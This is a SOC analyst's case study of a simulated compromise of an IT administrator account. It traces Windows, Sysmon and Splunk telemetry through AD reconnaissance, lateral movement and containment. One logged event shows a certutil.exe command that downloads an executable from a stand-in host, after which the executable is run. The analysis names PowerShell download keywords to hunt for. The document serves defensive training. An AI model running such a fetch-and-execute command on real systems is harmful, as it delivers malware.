
# SOC Investigation Case Study — The Compromised Administrator

## Investigation Objective

This exercise simulates a potential compromise involving a privileged IT administrator account and multiple Windows systems.

The objective was to determine where legitimate administrative activity transitioned into suspicious behavior, identify the point at which the activity became a confirmed security incident, reconstruct the attack chain, and determine the appropriate SOC response.

The investigation focused on:

* Windows authentication telemetry
* PowerShell Script Block Logging
* Active Directory reconnaissance
* Kerberos service-ticket activity
* Remote administration and lateral movement
* Suspicious outbound network connections
* LOLBin abuse through `certutil.exe`
* Malicious file creation and execution
* Splunk investigation and telemetry correlation

---

# Environment

```text
CLIENT20
User workstation
      |
      | ITAdmin01
      ↓
CLIENT21
Administrative workstation
      |
      ↓
DC01
Domain Controller
      |
      ↓
FILESERVER01
Finance File Server
```

---

# Telemetry Under Investigation

The following telemetry represents the complete sequence available to the SOC analyst.

### Event 1 — 09:17:03 — CLIENT20

```text
4624

Account: ITAdmin01
Logon Type: 2
```

Interactive logon by the administrative account.

---

### Event 2 — 09:17:11 — CLIENT20

```text
4688

mmc.exe

Command:
compmgmt.msc
```

The administrator opens Computer Management.

At this stage, the activity can reasonably be considered legitimate administrative behavior.

---

### Event 3 — 09:18:04 — CLIENT20

```text
4104

Get-Service
```

PowerShell enumerates services.

---

### Event 4 — 09:18:19 — CLIENT20

```text
4104

Get-Process
```

PowerShell enumerates running processes.

These commands are not inherently malicious and can commonly occur during system administration or troubleshooting.

---

### Event 5 — 09:19:02 — CLIENT20

```text
4104

Get-ADComputer -Filter *
```

The account begins broad Active Directory computer discovery.

---

### Event 6 — 09:19:21 — CLIENT20

```text
4104

Get-ADGroupMember "Domain Admins"
```

The account specifically queries membership of the highly privileged Domain Admins group.

This substantially increases the level of suspicion.

---

### Event 7 — 09:20:07 — DC01

```text
4769

Service:
cifs/CLIENT21

Account:
ITAdmin01
```

A Kerberos service-ticket request is generated for access to CLIENT21.

Given the preceding reconnaissance, this is significant because CLIENT21 appears to have become a target following the discovery activity.

---

### Event 8 — 09:20:15 — CLIENT21

```text
4624

Account: ITAdmin01
Logon Type: 3

Source:
CLIENT20
```

ITAdmin01 authenticates to CLIENT21 over the network from CLIENT20.

---

### Event 9 — 09:20:31 — CLIENT21

```text
4688

powershell.exe

Command:
Get-ChildItem C:\Users
```

PowerShell begins further discovery on CLIENT21.

---

### Event 10 — 09:21:04 — CLIENT21

```text
4104

Get-LocalGroupMember Administrators
```

The account investigates local administrator membership on CLIENT21.

---

### Event 11 — 09:21:47 — CLIENT21

```text
Sysmon Event 3

powershell.exe
        ↓
10.10.10.50:443
```

PowerShell establishes an outbound HTTPS connection.

By itself, an outbound connection over TCP/443 is not sufficient to establish maliciousness. However, its position immediately after administrative and privilege reconnaissance makes it highly relevant.

---

### Event 12 — 09:22:02 — CLIENT21

```text
4688

certutil.exe

Command:

-urlcache -split -f
https://updates-example.com/patch.exe
C:\ProgramData\patch.exe
```

This is a major escalation point.

`certutil.exe` is a legitimate Windows utility, but its ability to retrieve files can be abused by attackers as a **Living-off-the-Land Binary (LOLBin)**.

The command downloads an executable directly into:

```text
C:\ProgramData\patch.exe
```

---

### Event 13 — 09:22:18 — CLIENT21

```text
Sysmon Event 11

File Created

C:\ProgramData\patch.exe
```

The suspicious executable is confirmed to have been written to disk.

---

### Event 14 — 09:22:46 — CLIENT21

```text
4688

patch.exe
```

The downloaded executable is executed.

This provides substantially stronger evidence of compromise than the preceding download alone.

---

### Event 15 — 09:23:12 — CLIENT21

```text
Sysmon Event 3

patch.exe
        ↓
10.10.10.50:443
```

The newly executed executable establishes an outbound connection to the same external destination.

The sequence now resembles:

```text
PowerShell
    ↓
External connection
    ↓
certutil.exe
    ↓
Download executable
    ↓
patch.exe created
    ↓
patch.exe executed
    ↓
Outbound network connection
```

This is highly consistent with malicious execution and potential command-and-control or payload communication.

---

# 1. Where Does Legitimate Activity End?

My initial assessment is that the first clearly suspicious phase begins with:

```text
Get-ADComputer -Filter *
```

followed shortly by:

```text
Get-ADGroupMember "Domain Admins"
```

However, I would not automatically classify `Get-Service` or `Get-Process` as malicious.

Both are common administrative commands.

The important distinction is **context**.

A privileged IT administrator performing:

```text
Get-Service
Get-Process
```

could simply be troubleshooting a workstation.

The behavior becomes considerably more concerning when the same account progresses into:

```text
AD computer enumeration
        ↓
Domain Admin enumeration
        ↓
Kerberos access to CLIENT21
        ↓
Remote authentication
        ↓
Further privilege discovery
```

Therefore, I would describe the transition as:

> **Legitimate administrative activity → suspicious reconnaissance → confirmed malicious execution.**

---

# 2. First Point of Suspicion

My first strong point of suspicion is:

```text
09:19:21
Get-ADGroupMember "Domain Admins"
```

This command is not inherently malicious. Administrators may legitimately query privileged groups.

However, the context makes it significant.

The account had just performed broad computer discovery:

```text
Get-ADComputer -Filter *
```

and immediately followed it with:

```text
Get-ADGroupMember "Domain Admins"
```

This combination suggests the account may be attempting to understand:

1. What systems exist?
2. Which accounts have high privileges?
3. Which targets may provide greater access?

The subsequent Kerberos request for:

```text
cifs/CLIENT21
```

and network authentication from CLIENT20 to CLIENT21 strengthens that hypothesis.

---

# 3. When Does This Become an Incident?

The `certutil.exe` download at:

```text
09:22:02
```

is a major escalation point and would warrant immediate investigation and likely incident escalation.

However, the strongest point for declaring a confirmed security incident is:

```text
09:22:46

patch.exe
```

At this point, the suspicious executable has:

1. Been downloaded
2. Been written to disk
3. Been executed

The subsequent network connection from `patch.exe` to:

```text
10.10.10.50:443
```

further strengthens the conclusion.

Therefore:

> **I would move from suspicious investigation to confirmed incident once `patch.exe` executes, supported by the preceding download and subsequent network communication.**

---

# 4. Primary Affected Host

## CLIENT21

CLIENT21 is the primary affected host.

The attack progression on this system is:

```text
ITAdmin01
     ↓
Network authentication
     ↓
PowerShell discovery
     ↓
Local administrator enumeration
     ↓
Outbound connection
     ↓
certutil download
     ↓
patch.exe created
     ↓
patch.exe executed
     ↓
Outbound communication
```

CLIENT20 should also remain in scope because it is the initial workstation associated with the suspicious administrative activity.

The ITAdmin01 account is also considered compromised or potentially compromised until its legitimacy can be established.

---

# 5. Initial Splunk Investigation

My first investigation would pivot around the affected account:

```text
ITAdmin01
```

I would establish where and when the account authenticated before and after the observed sequence.

For example:

```spl
index=wineventlog Account_Name="ITAdmin01"
| table _time host EventCode Account_Name Logon_Type Source_Network_Address Process_Name CommandLine
| sort _time
```

The objective is to establish:

* Which systems ITAdmin01 accessed
* When those accesses occurred
* Where the account originated
* Whether CLIENT20 was the normal source
* Whether other systems were accessed
* Whether suspicious activity occurred outside the observed window

---

# 6. LogonGUID Pivot

Once the relevant `4624` authentication event is identified, I would pivot using the associated `LogonGUID`.

The purpose is to determine what activity occurred within the relevant authentication context.

Conceptually:

```text
4624
  ↓
LogonGUID
  ↓
Process creation
  ↓
PowerShell
  ↓
Network activity
```

This helps separate activity associated with the relevant user session from unrelated events occurring on the same host.

---

# 7. ProcessGUID Pivot

Where Sysmon telemetry is available, I would also use `ProcessGUID`.

This answers a different question.

### LogonGUID

Helps establish:

> Which activity belongs to this authentication/session?

### ProcessGUID

Helps establish:

> Which process generated or spawned this activity?

For example:

```text
powershell.exe
      ↓
ProcessGUID
      ↓
child process
      ↓
network activity
```

Using both pivots provides stronger correlation than relying on either identifier alone.

---

# 8. Additional Telemetry

After confirming the suspicious execution, I would immediately expand the investigation.

### Authentication — 4624 / 4625

I would determine:

* Where ITAdmin01 authenticated
* Whether there were failed logons
* Whether authentication originated from unusual systems
* Whether other accounts were used from CLIENT20 or CLIENT21

### Privileged Logon — 4672

I would determine whether the account received special privileges during the relevant session.

This helps establish the potential impact of the compromised administrative account.

### PowerShell — 4104

I would investigate the complete PowerShell activity before and after the download.

I would specifically look for:

```text
Invoke-WebRequest
IEX
DownloadString
Encoded commands
Obfuscation
Credential access
Persistence
```

### Process Creation — 4688 / Sysmon Event 1

I would reconstruct the complete process tree surrounding:

```text
certutil.exe
patch.exe
powershell.exe
```

The objective is to establish parent-child relationships and identify additional processes that may have executed.

### Network Telemetry — Sysmon Event 3

I would investigate:

```text
10.10.10.50:443
```

and determine:

* Which process connected to it
* When communication began
* Whether communication continued
* Whether other systems contacted the same destination

### DNS — Sysmon Event 22

If DNS telemetry is available, I would determine what hostname resolves to the destination and whether the domain has appeared elsewhere in the environment.

### File Creation — Sysmon Event 11

I would investigate:

```text
C:\ProgramData\patch.exe
```

including:

* File hash
* Creation time
* Parent process
* Digital signature
* File metadata
* Whether similar files exist elsewhere

### Persistence

I would investigate whether the attacker attempted to maintain access through:

* Scheduled tasks
* Services
* Registry Run keys
* WMI
* Startup folders
* Other autorun mechanisms

---

# 9. Containment

My first containment priority would be:

## Isolate CLIENT21

CLIENT21 has the strongest evidence of active compromise because the malicious executable has been downloaded and executed.

Isolation would prevent:

* Further command-and-control communication
* Additional payload retrieval
* Lateral movement
* Credential theft
* Further compromise of internal systems

I would avoid simply shutting the system down if forensic preservation is required, because volatile evidence may be valuable.

---

## Disable or Restrict ITAdmin01

I would temporarily disable or restrict the account, subject to the organization's incident-response procedures.

I would also:

* Revoke active sessions
* Reset credentials
* Invalidate authentication tokens where applicable
* Investigate credential exposure
* Review where the account authenticated

Because ITAdmin01 is an administrative account, its compromise could significantly expand the potential scope of the incident.

---

# 10. Why CLIENT20 Also Matters

CLIENT20 should not simply be treated as the harmless starting point.

It is the system where:

```text
ITAdmin01
      ↓
PowerShell
      ↓
AD reconnaissance
      ↓
CLIENT21 targeting
```

began.

I would therefore investigate CLIENT20 for:

* Initial access
* Malware execution
* Suspicious PowerShell
* Credential theft
* Persistence
* Unusual logons
* External connections
* Evidence of attacker-controlled activity

The investigation should determine whether CLIENT20 was the original compromised host or merely the workstation used by a legitimate administrator.

---

# 11. Attack Chain Reconstruction

Based on the available telemetry, the likely sequence is:

```text
ITAdmin01 logs onto CLIENT20
             ↓
      PowerShell execution
             ↓
      System discovery
             ↓
   AD computer enumeration
             ↓
 Domain Admin enumeration
             ↓
   CLIENT21 identified
             ↓
 Kerberos ticket request
             ↓
 CLIENT20 → CLIENT21
   network authentication
             ↓
      PowerShell discovery
             ↓
 Local administrator enumeration
             ↓
   External network connection
             ↓
       certutil.exe
             ↓
 Download patch.exe
             ↓
 patch.exe written to disk
             ↓
    patch.exe executed
             ↓
 patch.exe → 10.10.10.50:443
             ↓
 Potential C2 / payload communication
```

This represents a progression from **reconnaissance → targeting → remote access → payload delivery → execution → network communication**.

---

# 12. MITRE ATT&CK Relevance

Several behaviors in this investigation map naturally to MITRE ATT&CK techniques.

| Activity                            | ATT&CK Relevance                              |
| ----------------------------------- | --------------------------------------------- |
| `Get-ADComputer -Filter *`          | System/Network Discovery                      |
| `Get-ADGroupMember "Domain Admins"` | Permission/Account Discovery                  |
| Remote authentication to CLIENT21   | Remote Services                               |
| PowerShell execution                | Command and Scripting Interpreter: PowerShell |
| `certutil.exe` download             | Ingress Tool Transfer / LOLBin abuse          |
| `patch.exe` execution               | User Execution / Command Execution context    |
| Outbound HTTPS communication        | Application Layer Protocol: Web Protocols     |
| Potential credential targeting      | Credential Access                             |
| Administrative account abuse        | Valid Accounts                                |

The exact ATT&CK mapping would depend on additional telemetry and confirmed attacker objectives.

---

# 13. Detection Opportunities

This investigation demonstrates several opportunities for SIEM detection engineering.

A useful detection strategy would not alert simply because:

```text
Get-ADComputer -Filter *
```

was executed.

Instead, higher fidelity could come from correlating multiple behaviors:

```text
Privileged account
        +
AD reconnaissance
        +
Remote authentication
        +
Suspicious PowerShell
        +
External network connection
        +
LOLBin download
        +
Executable creation
        +
Executable execution
```

The combination is significantly more suspicious than any individual event.

---

# 14. Key SOC Lesson

The most important lesson from this exercise is that **context matters more than individual events**.

For example:

```text
Get-Process
```

is normal.

```text
Get-ADComputer -Filter *
```

can be legitimate.

```text
Get-ADGroupMember "Domain Admins"
```

can also be legitimate.

```text
certutil.exe
```

is a legitimate Windows utility.

HTTPS traffic on port 443 is normal.

But when these behaviors occur sequentially:

```text
Discovery
   ↓
Privileged target identification
   ↓
Remote access
   ↓
Payload download
   ↓
Executable creation
   ↓
Execution
   ↓
External communication
```

the combined evidence tells a very different story.

This is the type of contextual reasoning required during real SOC investigations.

---

# Conclusion

This exercise reinforced the importance of distinguishing **legitimate administrative activity from malicious behavior occurring through legitimate tools**.

The investigation began with an administrative account performing activity that could initially appear normal. Contextual analysis revealed increasingly suspicious Active Directory reconnaissance, remote access to an administrative workstation, LOLBin-based payload delivery, executable creation, execution, and subsequent outbound communication.

The strongest evidence of compromise occurred when:

```text
certutil.exe
      ↓
patch.exe
      ↓
execution
      ↓
external communication
```

was observed on CLIENT21.

The investigation therefore demonstrates a complete SOC workflow:

```text
Observe
   ↓
Establish baseline
   ↓
Identify anomaly
   ↓
Correlate telemetry
   ↓
Reconstruct attack chain
   ↓
Confirm compromise
   ↓
Scope affected assets
   ↓
Contain
   ↓
Investigate and recover
```

The exercise strengthened my practical understanding of Windows telemetry, Splunk investigation, PowerShell analysis, Active Directory reconnaissance, LOLBin abuse, process correlation, and incident-response decision making.

---

## Author

**Precious Ifeanyi Anyanwu**

Entry-Level SOC Analyst | Cloud Security | CompTIA Security+ | AWS Certified | ISC2 CC

## [GitHub](https://github.com/precious-anyanwu) | [LinkedIn](http://linkedin.com/in/precious-anyanwu-627309291)

### Key Skills Demonstrated

`Splunk` `Windows Event Logs` `PowerShell` `Sysmon` `Threat Hunting` `Incident Response` `Active Directory` `MITRE ATT&CK` `Process Correlation` `SIEM Detection`
